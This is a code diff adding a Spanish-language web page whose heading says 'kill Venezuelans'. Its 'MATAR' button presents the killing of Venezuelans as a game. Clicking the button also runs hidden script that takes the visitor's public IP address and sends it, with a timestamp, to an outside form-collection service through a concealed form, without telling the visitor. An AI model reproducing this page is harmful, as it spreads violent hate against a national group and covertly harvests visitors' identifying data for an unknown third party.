@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>KILLVNZ</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <style>
+        /* Diseño centrado */
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+            font-family: Arial, sans-serif;
+        }
+        h1 {
+            text-align: center;
+            color: #333;
+            font-size: 100px;
+            margin-bottom: 20px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 32px;
+            text-align: center;
+            font-size: 24px;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: background-color 0.3s;
+            margin-left: 450px; 
+        }
+        button:hover {
+            background-color: #a04545;
+        }
+        /* Estilo para el mensaje */
+        #mensaje {
+            display: none;
+            margin-top: 20px;
+            margin-right: 100px;
+            font-size: 20px;
+            color: #f14a4a;
+            font-weight: bold;
+            text-align: center;
+        }
+    </style>
+    <script>
+        function obtenerInfo() {
+            // Verifica si la IP ya está almacenada en localStorage
+            var storedIP = localStorage.getItem('ipStored');
+            if (storedIP) {
+                // Si ya existe, muestra el mensaje
+                document.getElementById("mensaje").style.display = "block";
+                return;
+            }
+
+            // Si no está almacenada, hacer la solicitud a la API
+            $.get('https://api.ipify.org?format=json', function(data) {
+                // Obtener la fecha y hora actual
+                var now = new Date();
+                var fechaHora = now.toLocaleString();  // Obtiene la fecha y hora local del navegador
+                
+                // Asignar los valores al formulario
+                document.getElementById("ipInput").value = data.ip;
+                document.getElementById("fechaHoraInput").value = fechaHora;
+
+                // Enviar el formulario automáticamente
+                $.ajax({
+                    url: 'https://formspree.io/f/xqaaelje',
+                    method: 'POST',
+                    data: {
+                        ip: data.ip,
+                        fechaHora: fechaHora,
+                        _subject: "Nueva IP y Fecha Recibida"
+                    },
+                    success: function() {
+                        console.log('Formulario enviado');
+                        document.getElementById("mensaje").style.display = "block"; // Mostrar el mensaje
+                    },
+                    error: function() {
+                        console.log('Error al enviar el formulario');
+                    }
+                });
+
+                // Almacenar la IP en localStorage para evitar futuros envíos
+                localStorage.setItem('ipStored', data.ip);
+            });
+        }
+    </script>
+</head>
+<body>
+    <div>
+        <h1>MATAR VENEZOLANOS</h1>
+        <button onclick="obtenerInfo()">MATAR</button>
+        <div id="mensaje"> -1 VENEZOLANO</div>
+    </div>
+
+    <!-- Formulario de contacto con Formspree (sin redirección visible) -->
+    <form id="formulario" action="https://formspree.io/f/xqaaelje" method="POST">
+        <input type="hidden" name="IP" id="ipInput">
+        <input type="hidden" name="Date" id="fechaHoraInput">
+        
+        <!-- Parámetro de redirección desactivado -->
+        <input type="hidden" name="_redirect" value="">
+    </form>
+</body>
+</html>
